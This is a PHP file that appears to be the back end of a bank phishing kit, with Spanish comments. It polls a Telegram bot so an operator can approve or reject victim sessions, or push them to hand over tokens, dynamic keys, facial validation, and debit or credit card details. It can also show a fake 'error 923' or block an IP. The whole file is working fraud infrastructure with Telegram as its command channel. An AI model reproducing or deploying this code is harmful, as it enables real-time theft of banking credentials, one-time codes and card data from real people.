<?php
/**
 * ================================================================
 * API Poll — Consulta estado de aprobación (Compatible con Vercel/Render)
 * ================================================================
 * Lee el archivo de sesión correspondiente. Si es necesario, también
 * procesa updates de Telegram (evita múltiples llamadas getUpdates).
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

$sessionId = $_GET['sessionId'] ?? ($_POST['sessionId'] ?? '');
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
    echo json_encode(['ok' => false, 'error' => 'sessionId inválido']);
    exit;
}

// ── Directorio compatible con Vercel (/tmp) y Render (local) ──
$dataDir = is_writable(__DIR__ . '/../data') ? __DIR__ . '/../data' : sys_get_temp_dir() . '/data';

$sessionFile = $dataDir . "/{$sessionId}.json";
if (!file_exists($sessionFile)) {
    echo json_encode(['ok' => false, 'error' => 'Sesión no encontrada']);
    exit;
}

// ── Leer sesión ──
$session = json_decode(file_get_contents($sessionFile), true) ?: [];

// ── Si ya tiene acción, devolver directamente ──
if (($session['status'] ?? '') !== 'pending') {
    echo json_encode([
        'ok'     => true,
        'status' => $session['status'],
        'action' => $session['action'] ?? null,
        'step'   => $session['step'] ?? null
    ]);
    exit;
}

// ── Procesar updates de Telegram si es necesario ──
$globalLockFile   = $dataDir . '/.telegram.flock';
$globalOffsetFile = $dataDir . '/.telegram.offset';
$globalTimeFile   = $dataDir . '/.telegram.time';

$shouldProcess = false;
$lockFp = @fopen($globalLockFile, 'c');
if ($lockFp) {
    if (flock($lockFp, LOCK_EX | LOCK_NB)) {
        // Verificar si pasaron 2 segundos desde el último procesamiento
        $lastProcessed = (int)@file_get_contents($globalTimeFile);
        if ((time() - $lastProcessed) >= 2) {
            $shouldProcess = true;
            @file_put_contents($globalTimeFile, (string)time(), LOCK_EX);
        }
        flock($lockFp, LOCK_UN);
    }
    fclose($lockFp);
}

if ($shouldProcess) {
    processTelegramUpdates($botToken, $chatId, $globalOffsetFile, $dataDir);
}

// ── Releer sesión actualizada ──
$session = json_decode(file_get_contents($sessionFile), true) ?: [];

echo json_encode([
    'ok'          => true,
    'status'      => ($session['status'] ?? '') === 'completed' ? 'completed' : 'pending',
    'action'      => $session['action'] ?? null,
    'step'        => $session['currentStep'] ?? null,
    'sessionId'   => $sessionId
]);
exit;

// ────────────────────────────────────────────
// Función: Procesar todos los updates de Telegram
// ────────────────────────────────────────────
function processTelegramUpdates($botToken, $chatId, $offsetFile, $dataDir) {
    $lastUpdateId = (int)@file_get_contents($offsetFile);
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($lastUpdateId + 1) . "&limit=100";

    $tgResponse = @file_get_contents($url);
    if ($tgResponse === false) return;

    $tgData = json_decode($tgResponse, true);
    if (!$tgData['ok'] || empty($tgData['result'])) return;

    $maxUpdateId = $lastUpdateId;

    foreach ($tgData['result'] as $update) {
        $updateId = $update['update_id'];
        if ($updateId > $maxUpdateId) $maxUpdateId = $updateId;

        if (!isset($update['callback_query'])) continue;

        $cb = $update['callback_query'];
        $cbData = $cb['data'] ?? '';
        $cbqId  = $cb['id'] ?? '';

        // Parsear: accion_step_sessionId
        if (!preg_match('/^(\w+)_(.+)_(sess_[a-zA-Z0-9_]+)$/', $cbData, $m)) continue;

        $action = $m[1];
        $step   = $m[2];
        $sessId = $m[3];

        // Responder callback inmediatamente
        if ($cbqId) {
            @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
        }

        // Actualizar sesión correspondiente usando el directorio correcto
        $sessFile = $dataDir . "/{$sessId}.json";
        if (!file_exists($sessFile)) continue;

        $sessFp = fopen($sessFile, 'r+');
        if (!$sessFp || !flock($sessFp, LOCK_EX)) continue;

        $sessContent = stream_get_contents($sessFp);
        $sessData = json_decode($sessContent, true) ?: [];

        if (($sessData['status'] ?? '') === 'pending') {
            $sessData['status'] = 'completed';
            $sessData['action'] = $action;

            // Actualizar mensaje en Telegram
            $msgId = $sessData['messageId'] ?? null;
            if ($msgId) {
                $actionLabels = [
                    'aprobar'  => '✅ APROBADO',
                    'rechazar' => '❌ RECHAZADO',
                    'token'    => '🔐 SOLICITAR TOKEN',
                    'dinamica' => '💳 SOLICITAR CLAVE DINÁMICA',
                    'face'     => '👤 SOLICITAR VALIDACIÓN FACIAL',
                    'debito'   => '💳 SOLICITAR TARJETA DÉBITO',
                    'credito'  => '💰 SOLICITAR TARJETA CRÉDITO',
                    '923'      => '⚠️ ENVIAR ERROR 923',
                    'banip'    => '🚫 BLOQUEAR IP'
                ];
                $actionText = $actionLabels[$action] ?? 'Acción realizada';
                $originalText = $sessData['messageText'] ?? '';
                $newText = $originalText . "\n\n<b>" . $actionText . "</b>";

                $editBody = http_build_query([
                    'chat_id'      => $chatId,
                    'message_id'   => $msgId,
                    'text'         => $newText,
                    'parse_mode'   => 'HTML',
                    'reply_markup' => json_encode(['inline_keyboard' => []])
                ]);

                $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
                curl_setopt_array($ch, [
                    CURLOPT_POST             => true,
                    CURLOPT_POSTFIELDS       => $editBody,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT        => 10,
                    CURLOPT_SSL_VERIFYPEER => true
                ]);
                curl_exec($ch);
                curl_close($ch);
            }

            ftruncate($sessFp, 0);
            rewind($sessFp);
            fwrite($sessFp, json_encode($sessData));
            fflush($sessFp);
        }

        flock($sessFp, LOCK_UN);
        fclose($sessFp);
    }

    // Guardar offset global en el directorio correcto
    @file_put_contents($offsetFile, (string)$maxUpdateId, LOCK_EX);
}